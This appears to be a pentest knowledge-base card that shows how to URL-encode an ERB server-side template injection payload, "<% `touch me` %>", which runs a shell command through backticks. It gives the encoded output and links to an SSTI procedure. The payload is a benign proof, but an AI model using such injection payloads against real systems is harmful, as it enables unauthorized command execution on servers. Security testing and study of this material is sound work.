---
data: encodeURIComponent("<% `touch me` %>")
tags:
  - encoding
  - payload
type: command
executor: javascript
platforms:
  - Web
id: 68970a0c-1d95-4f0f-aff3-9db7cf04842a
created_at: '2025-12-13T09:01:16.861Z'
updated_at: '2025-12-13T09:01:16.861Z'
verified: false
validated: true
submitted: true
---
# encode-uri-component-payload

## Command

```javascript
encodeURIComponent("<% `touch me` %>")
```

## Description

Encodes a string to be URL-safe, used to prepare the SSTI payload for injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"<% `touch me` %>"` | String to encode, containing ERB code | Yes |

## Examples

### Basic Usage

```javascript
encodeURIComponent("<% `touch me` %>")
```

## Expected Output

"%3C%25%20%60touch%20me%60%20%25%3E".

## Related

- [[procedures/Prepare-SSTI-Payload]]
